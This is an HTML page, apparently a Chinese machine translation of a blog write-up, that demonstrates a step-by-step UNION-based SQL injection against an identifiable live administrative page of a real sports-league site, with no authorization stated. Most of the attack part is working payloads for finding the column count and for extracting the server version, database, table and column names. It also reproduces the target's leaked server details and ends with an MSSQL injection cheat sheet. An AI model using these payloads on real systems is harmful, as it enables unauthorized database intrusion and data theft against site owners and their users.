<html>
<head>
<title>Fun SQL Injection 2 — MSSQL</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">有趣的SQL注入2 — MSSQL</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/fun-sql-injection-2-mssql-f2f3c83d0cf8?source=collection_archive---------1-----------------------#2021-05-28">https://infosecwriteups.com/fun-sql-injection-2-mssql-f2f3c83d0cf8?source=collection_archive---------1-----------------------#2021-05-28</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="aed6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这个场合，我想一步一步地讲述我最喜欢的另一种注射。</p><p id="e4b7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一个同事来找我一起测试的站点！</p><p id="ffbb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">攻击发生的参数用于显示一个PDF文档，正是利用这个参数，我们引导自己发现这次注入将有多少列！我们开始了！</p></div><div class="ab cl kl km hu kn" role="separator"><span class="ko bw bk kp kq kr"/><span class="ko bw bk kp kq kr"/><span class="ko bw bk kp kq"/></div><div class="ij ik il im in"><p id="8b92" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先我们有链接</p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="0980" class="lb lc iq kx b gy ld le l lf lg">site/ejemplo/parametro<a class="ae lh" href="https://administrador.ligamx.net/php/cmpt/CMPT_InfrArbt.php?pnIDPartido=25527" rel="noopener ugc nofollow" target="_blank">=25527</a></span></pre><figure class="ks kt ku kv gt lj gh gi paragraph-image"><div role="button" tabindex="0" class="lk ll di lm bf ln"><div class="gh gi li"><img src="../Images/5ac0e3360600ac8b53ac3a8d5702b421.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SHjblEvDLx2j1qMp-pjPKw.png"/></div></div></figure><p id="cc0c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这样我们就可以看到网站工作正常！..但是，正如大多数容易受到sql注入攻击的站点所发生的那样，只需在参数末尾添加一个',就可以看到SQL错误</p><p id="246d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">错误:</strong></p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="46bb" class="lb lc iq kx b gy ld le l lf lg">site/ejemplo/parametro<a class="ae lh" href="https://administrador.ligamx.net/php/cmpt/CMPT_InfrArbt.php?pnIDPartido=25527" rel="noopener ugc nofollow" target="_blank">=25527</a>'</span></pre><figure class="ks kt ku kv gt lj gh gi paragraph-image"><div role="button" tabindex="0" class="lk ll di lm bf ln"><div class="gh gi lq"><img src="../Images/f25a02ef83929c1a0c753aaedc2fb8d2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*b05jWNtUsI-tWHaJnOiwVQ.png"/></div></div></figure><p id="5bd6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">既然我们已经确定了站点是易受攻击的，并且我们知道我们正在处理的数据库，在本例中是MSSQL，我们将检测列的数量，为此我们将使用ORDER BY函数。</p><p id="2ffe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">检测列数</strong></p><p id="89f5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用前面提到的函数，我们进行第一次测试，以验证站点是否允许我们使用这种列检测方法。</p><p id="fc4c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们看到的第一件事是，当使用order by 1时，站点继续正常工作，但使用order by 100时，一切都会下降并向我们显示错误，这是一个非常好的方法，这意味着我们可以使用此方法来检测，例如:</p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="ee32" class="lb lc iq kx b gy ld le l lf lg">site/ejemplo/parametro<a class="ae lh" href="https://administrador.ligamx.net/php/cmpt/CMPT_InfrArbt.php?pnIDPartido=25527" rel="noopener ugc nofollow" target="_blank">=-25527</a> order by 1 --</span></pre><figure class="ks kt ku kv gt lj gh gi paragraph-image"><div role="button" tabindex="0" class="lk ll di lm bf ln"><div class="gh gi lr"><img src="../Images/046f079ba84d547c56163ac3318449a7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oYEWJA9GaNKGN3nN4nW-2A.png"/></div></div></figure><p id="df80" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如我们之前提到的，通过1排序，站点可以继续正常工作</p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="723c" class="lb lc iq kx b gy ld le l lf lg">site/ejemplo/parametro<a class="ae lh" href="https://administrador.ligamx.net/php/cmpt/CMPT_InfrArbt.php?pnIDPartido=25527" rel="noopener ugc nofollow" target="_blank">=-25527</a> order by 100 --</span></pre><figure class="ks kt ku kv gt lj gh gi paragraph-image"><div role="button" tabindex="0" class="lk ll di lm bf ln"><div class="gh gi ls"><img src="../Images/47a3e86e56a11b46abe1e400ce8a4940.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vYeyf3iBX6_GqM-C9CRJCg.png"/></div></div></figure><p id="b097" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是100的订单向我们展示了错误。</p><p id="da4a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了正确地找到列数，我们必须在它显示错误之前更接近该值，我在关于手动sql注入的文章中对此进行了更详细的解释，如果您还没有阅读它们，我建议您阅读它们，因为您可以更好地理解这一部分。</p><p id="28bc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">示例:</p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="2535" class="lb lc iq kx b gy ld le l lf lg">Order by 1 ---&gt; sin error<br/>Order by 2 ---&gt; sin error<br/>Order by 3 ---&gt; sin error<br/>Order by 4 ---&gt; error</span></pre><p id="a4d8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这意味着该网站有3列。</p></div><div class="ab cl kl km hu kn" role="separator"><span class="ko bw bk kp kq kr"/><span class="ko bw bk kp kq kr"/><span class="ko bw bk kp kq"/></div><div class="ij ik il im in"><p id="21ff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">回到易受攻击的站点，它有47列</p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="dd2f" class="lb lc iq kx b gy ld le l lf lg">site/ejemplo/parametro<a class="ae lh" href="https://administrador.ligamx.net/php/cmpt/CMPT_InfrArbt.php?pnIDPartido=25527" rel="noopener ugc nofollow" target="_blank">=-25527</a> UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47 --</span></pre><figure class="ks kt ku kv gt lj gh gi paragraph-image"><div role="button" tabindex="0" class="lk ll di lm bf ln"><div class="gh gi lt"><img src="../Images/9bfa4b87e8fc0b81ad688644ad4e5b9e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KRBwDXMw7YPHk1j-VjNf3g.png"/></div></div></figure><p id="d2bc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如我们所看到的，添加一个包含47列的union select改变了错误消息，最有趣的是我们看到红色圆圈内有2个数字。</p><p id="c5f8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这些数字是易受攻击的列，我们将在这些列中引入句子来显示数据库中的信息！</p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="b01e" class="lb lc iq kx b gy ld le l lf lg">site/ejemplo/parametro<a class="ae lh" href="https://administrador.ligamx.net/php/cmpt/CMPT_InfrArbt.php?pnIDPartido=25527" rel="noopener ugc nofollow" target="_blank">=-25527</a> UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,'_Y000_ LuisMadero',26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47 --</span></pre><figure class="ks kt ku kv gt lj gh gi paragraph-image"><div role="button" tabindex="0" class="lk ll di lm bf ln"><div class="gh gi lu"><img src="../Images/c097bf5302304f6eb90e04b38eb0cc80.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cqgrMetOUMJ2O_H7_VzrGQ.png"/></div></div></figure><p id="08c4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如我们所看到的，第25列允许我们从数据库中写入和接收数据，我们将使用该列进行工作！</p><p id="aaf7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">版本</strong></p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="bd69" class="lb lc iq kx b gy ld le l lf lg">site/ejemplo/parametro<a class="ae lh" href="https://administrador.ligamx.net/php/cmpt/CMPT_InfrArbt.php?pnIDPartido=25527" rel="noopener ugc nofollow" target="_blank">=-25527</a> UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,@@version,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47 --</span></pre><figure class="ks kt ku kv gt lj gh gi paragraph-image"><div role="button" tabindex="0" class="lk ll di lm bf ln"><div class="gh gi lv"><img src="../Images/2c9c5f1ee8e11c477ce27f72136fba9d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ub-1Cttudct64K_9uKihOw.png"/></div></div></figure><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="57cc" class="lb lc iq kx b gy ld le l lf lg">message: Error de conversión al convertir el valor nvarchar 'Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64) <br/>	Apr  2 2010 15:48:46 <br/>	Copyright (c) Microsoft Corporation<br/>	Standard Edition (64-bit) on Windows NT 6.1 &amp;lt;X64&amp;gt; (Build 7601: Service Pack 1)<br/>' al tipo de datos smallint. (severity 16)</span></pre><p id="ed3e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们有了数据库的版本！</p><p id="94e7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">数据库</strong></p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="9444" class="lb lc iq kx b gy ld le l lf lg">site/ejemplo/parametro<a class="ae lh" href="https://administrador.ligamx.net/php/cmpt/CMPT_InfrArbt.php?pnIDPartido=25527" rel="noopener ugc nofollow" target="_blank">=-</a>25527 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,(select top 1  name FROM master..sysdatabases),26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47--</span></pre><p id="ff0f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，要获得我正在使用的数据库的名称:</p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="88e1" class="lb lc iq kx b gy ld le l lf lg">(select top 1 name FROM master..sysdatabases)</span></pre><p id="ef93" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因为数据库中易受攻击的函数的语法不允许我反映一个以上的值，也不允许连接。</p><p id="0cca" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，它给我的数据库的名称是“ADPR”。</p><p id="7ef3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">@ @服务器名</strong></p><p id="a324" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了知道这个值，我们只使用下面的有效载荷</p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="ba6d" class="lb lc iq kx b gy ld le l lf lg">-25527UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,@@SERVERNAME,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47</span></pre><p id="0b7b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">列表表格</strong></p><p id="1de9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">要列出这些表，找到一个有效负载有点困难，因为正如我前面提到的，这个数据库不允许我同时显示多个结果，使用这个有效负载:</p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="78c1" class="lb lc iq kx b gy ld le l lf lg">-25527UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,table_name,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47 from (select top 1 table_name from information_schema.tables order by 1) as a order by 1 desc--</span></pre><p id="3fc4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们使用“top 1”来列出该表，在本例中，数字1表示数据库中的1号表。</p><p id="88dd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这种情况下。这个表叫做“CDLA Partidos”</p><p id="4341" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">列表栏</strong></p><p id="cc97" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为此，我们使用前面有效负载的变体，但是现在我们将重点放在枚举该表的列上。</p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="f851" class="lb lc iq kx b gy ld le l lf lg">-25527UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,column_name,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47 from (select top 1 column_name from information_schema.columns where table_name='_CDLA_Partidos' order by 1) as 1 order by 1 desc--</span></pre><p id="7ace" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">按照同样的逻辑，更改“top”的数字会显示下一列。</p><p id="0ae1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第一列的名称称为“Prtd_IDPartidos”</p><blockquote class="lw lx ly"><p id="208a" class="jn jo lz jp b jq jr js jt ju jv jw jx ma jz ka kb mb kd ke kf mc kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="iq">注意:我将把这个注入留到这里，不会显示太多信息，因为我不想损害站点。表格和列的名称说明了很多……</em>T5】</strong></p></blockquote><p id="2b33" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> MSSQL SQL注入作弊工具</strong></p><pre class="ks kt ku kv gt kw kx ky kz aw la bi"><span id="ba81" class="lb lc iq kx b gy ld le l lf lg">--           :     Comment Type 1<br/>--+          :     Comment Type 2<br/>--+-         :     SQL Comment<br/>/**/         :     Inline Comment<br/>;%00         :     Null Byte</span><span id="6f38" class="lb lc iq kx b gy md le l lf lg">@@version    :     Current Version<br/>user_name()  :     Current User<br/>user         :     Current User<br/>db_name()    :     Current Database<br/>@@SERVERNAME :     Hostname</span><span id="50c1" class="lb lc iq kx b gy md le l lf lg">Tables</span><span id="6e2e" class="lb lc iq kx b gy md le l lf lg">union select table_name from (select top 1 table_name from information_schema.tables order by 1) as 1 order by 1 desc--</span><span id="23cd" class="lb lc iq kx b gy md le l lf lg">Columns</span><span id="1f32" class="lb lc iq kx b gy md le l lf lg">union select column_name from (select top 1 column_name from information_schema.columns where table_name='table' order by 1) as 1 order by 1 desc--</span><span id="6676" class="lb lc iq kx b gy md le l lf lg">Dump info</span><span id="d69a" class="lb lc iq kx b gy md le l lf lg">union select culumn form table--</span></pre></div></div>    
</body>
</html>